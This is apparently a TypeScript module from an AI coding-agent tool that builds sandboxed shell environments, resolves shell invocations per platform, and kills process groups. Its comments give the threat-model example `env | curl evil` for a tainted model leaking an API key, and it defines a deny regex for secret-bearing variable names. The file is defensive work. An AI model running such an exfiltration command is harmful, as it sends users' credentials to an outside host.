/**
 * spawn-common — shared subprocess primitives for foreground (safeSpawnShell)
 * and background (BackgroundShellManager) shell execution.
 *
 * Both paths must agree on three things or their security/behavior drifts:
 *
 *   1. How a free-form shell command is turned into an actual (file, args)
 *      under the active sandbox backend ({@link resolveSpawnTarget}).
 *   2. Which environment variables are forwarded into a sandboxed shell
 *      ({@link buildSandboxEnv} + {@link ENV_DENY_REGEX}) — the Bash threat
 *      model (a tainted model exfiltrating `OPENROUTER_API_KEY` via
 *      `env | curl evil`).
 *   3. How a process is terminated — SIGTERM → grace → SIGKILL. The
 *      background path needs this at *process-group* granularity
 *      ({@link killProcessGroup}) because `npm run dev` is really
 *      `sh → npm → node vite` and killing only the outer `sh` leaks the
 *      vite child that holds the port (design §难点2).
 *
 * safeSpawnShell keeps its own single-process kill cascade (it does not
 * spawn detached, so there's no separate process group to reap); it shares
 * (1) and (2) here. The background manager uses all three.
 */

import type { SandboxBackend } from "../tool-system/sandbox/index.js";

/**
 * Env vars that are always safe to forward into a sandboxed shell. Mirrors
 * the allowlist that previously lived in bash.ts — kept here so foreground
 * and background shells share one source of truth. The `off` backend keeps
 * the historical full-passthrough behavior (the user opted out of sandboxing)
 * and does NOT call this.
 */
export const ENV_ALLOWLIST: ReadonlySet<string> = new Set([
  "PATH",
  "HOME",
  "USER",
  "LOGNAME",
  "SHELL",
  "LANG",
  "LC_ALL",
  "LC_CTYPE",
  "TERM",
  "TMPDIR",
  "TZ",
  "COLUMNS",
  "LINES",
  "PWD",
]);

/**
 * Names matching these patterns are dropped even if they appear in the
 * allowlist (defense in depth — e.g. a user setting `PATH_TOKEN` shouldn't
 * leak just because it starts with `PATH`). Case-insensitive on the full name.
 */
export const ENV_DENY_REGEX =
  /(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|SESSION|AUTH|COOKIE|PRIVATE)/i;

/**
 * Build a hardened env for a sandboxed shell: allowlist ∖ deny-regex.
 * `source` defaults to `process.env` so callers usually omit it; tests pass
 * a fixed object.
 */
export function buildSandboxEnv(source: NodeJS.ProcessEnv = process.env): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const name of ENV_ALLOWLIST) {
    const v = source[name];
    if (v !== undefined && !ENV_DENY_REGEX.test(name)) {
      out[name] = v;
    }
  }
  return out;
}

/**
 * Layer a project's `localEnvironment.env` (KEY=VALUE pairs the user
 * explicitly configured in `.code-shell/settings.json`) on top of a base
 * shell env.
 *
 * Unlike {@link buildSandboxEnv}, project env values are NOT filtered through
 * the deny regex: the user put them there deliberately (e.g. `DATABASE_URL`,
 * a project-scoped `API_BASE`), so honoring them is the whole point. The
 * allowlist/deny machinery exists to stop a tainted model from exfiltrating
 * the *host's* secrets via `env | curl`; values the user typed into project
 * settings are a different trust class.
 *
 * Returns the base unchanged when `projectEnv` is empty/undefined, so the
 * caller can pass it through unconditionally with zero behavior change for
 * projects that don't configure one. `undefined` values in `projectEnv` are
 * skipped (they'd otherwise stringify to "undefined").
 */
export function mergeShellEnv(
  base: NodeJS.ProcessEnv,
  projectEnv: Record<string, string> | undefined,
): NodeJS.ProcessEnv {
  if (!projectEnv) return base;
  const keys = Object.keys(projectEnv);
  if (keys.length === 0) return base;
  const out: NodeJS.ProcessEnv = { ...base };
  for (const k of keys) {
    const v = projectEnv[k];
    if (v !== undefined) out[k] = v;
  }
  return out;
}

export interface SpawnTarget {
  file: string;
  args: string[];
  /** Backend-allocated resource cleanup (e.g. seatbelt temp profile). */
  cleanup?: () => void;
}

/**
 * Resolve the shell binary + the (file, args) needed to run a free-form
 * `command` string through it, per platform. Centralizes the POSIX-vs-Windows
 * shell fork that was previously hardcoded as `/bin/bash` + `["-c", command]`
 * in five places (bash.ts, safe-spawn.ts, background-shell.ts, worktree.ts):
 *
 *   - POSIX: `<explicit ?? $SHELL ?? /bin/bash> -c "<command>"`
 *   - Windows: `cmd.exe /c "<command>"` (the `-c` flag does not exist on cmd;
 *     a bare `-c` would be taken as a filename and fail). PowerShell uses
 *     `-Command`, but cmd.exe is the safe default present on every Windows.
 *
 * `$SHELL` is ignored on Windows — it is virtually never set there, and when
 * it is (e.g. a stray value from a Unix-y env) it points at a POSIX path that
 * doesn't exist on the host. An explicit `shell` overrides everything (a user
 * who configured `pwsh`/`bash` knows what they want).
 */
export function resolveShellInvocation(
  command: string,
  shell?: string,
): { file: string; args: string[] } {
  if (process.platform === "win32") {
    const file = shell ?? process.env.ComSpec ?? "cmd.exe";
    // PowerShell variants take -Command; cmd.exe (and cmd-like) take /c.
    const isPwsh = /(^|[\\/])(pwsh|powershell)(\.exe)?$/i.test(file);
    return isPwsh ? { file, args: ["-Command", command] } : { file, args: ["/c", command] };
  }
  const file = shell ?? process.env.SHELL ?? "/bin/bash";
  return { file, args: ["-c", command] };
}

/** The platform's default interactive shell binary, for spawning a bare shell
 *  (no `-c`/`/c` command). Windows → ComSpec/cmd.exe; POSIX → $SHELL/bin/bash. */
export function defaultShellBinary(shell?: string): string {
  if (shell) return shell;
  if (process.platform === "win32") return process.env.ComSpec ?? "cmd.exe";
  return process.env.SHELL ?? "/bin/bash";
}

/**
 * Resolve the actual (file, args) for a shell `command` under an optional
 * sandbox. With a sandbox, the backend decides (e.g. seatbelt →
 * `sandbox-exec -f profile shell -c command`). Without one, plain
 * `shell -c command`. This is exactly safeSpawnShell's pre-spawn logic,
 * lifted so the background path produces an identical target.
 */
export function resolveSpawnTarget(
  command: string,
  opts: { cwd: string; shell: string; sandbox?: SandboxBackend },
): SpawnTarget {
  if (opts.sandbox) {
    const wrapped = opts.sandbox.wrap(command, { cwd: opts.cwd, shell: opts.shell });
    return { file: wrapped.file, args: wrapped.args, cleanup: wrapped.cleanup };
  }
  // No sandbox (the `off` backend / Windows): pick the shell + command-flag
  // form for the platform instead of assuming POSIX `-c`.
  return resolveShellInvocation(command, opts.shell);
}

const DEFAULT_GROUP_GRACE_MS = 3000;

/**
 * Terminate an entire process group, SIGTERM → grace → SIGKILL.
 *
 * Targets the group by negating the leader pid (`process.kill(-pgid, sig)`),
 * which requires the leader to have been spawned `detached: true` so its pid
 * is its own pgid. This is the background path's answer to design §难点2:
 * `npm run dev`'s real tree (`sh → npm → node vite`) all share the group, so
 * one group-level signal reaps the vite child that actually holds the port.
 *
 * Resolves once the group is confirmed gone (or the grace SIGKILL has been
 * sent). Idempotent: a group that's already dead (ESRCH) resolves immediately
 * without throwing.
 *
 * @param pgid  The process-group id == the detached leader's pid.
 */
export function killProcessGroup(
  pgid: number,
  opts: { graceMs?: number } = {},
): Promise<void> {
  const grace = opts.graceMs ?? DEFAULT_GROUP_GRACE_MS;
  return new Promise<void>((resolve) => {
    if (!groupAlive(pgid)) {
      resolve();
      return;
    }
    try {
      process.kill(-pgid, "SIGTERM");
    } catch {
      // Already gone, or not permitted — fall through to the grace check.
    }

    const start = Date.now();
    // Poll for graceful exit so we can resolve early (and skip SIGKILL) when
    // the group honors SIGTERM. Cheap: a `kill(-pgid, 0)` probe every 50ms.
    const tick = (): void => {
      if (!groupAlive(pgid)) {
        resolve();
        return;
      }
      if (Date.now() - start >= grace) {
        try {
          process.kill(-pgid, "SIGKILL");
        } catch {
          // Race: exited between the probe and here. Fine.
        }
        // Give the OS a beat to tear the group down before resolving so
        // callers that immediately probe see ESRCH.
        setTimeout(resolve, 50);
        return;
      }
      setTimeout(tick, 50);
    };
    setTimeout(tick, 50);
  });
}

/**
 * True if any process in the group `pgid` is still alive. Signal 0 performs
 * existence/permission checks without delivering a signal; ESRCH means the
 * whole group is gone.
 */
export function groupAlive(pgid: number): boolean {
  try {
    process.kill(-pgid, 0);
    return true;
  } catch (e) {
    return (e as NodeJS.ErrnoException).code !== "ESRCH";
  }
}
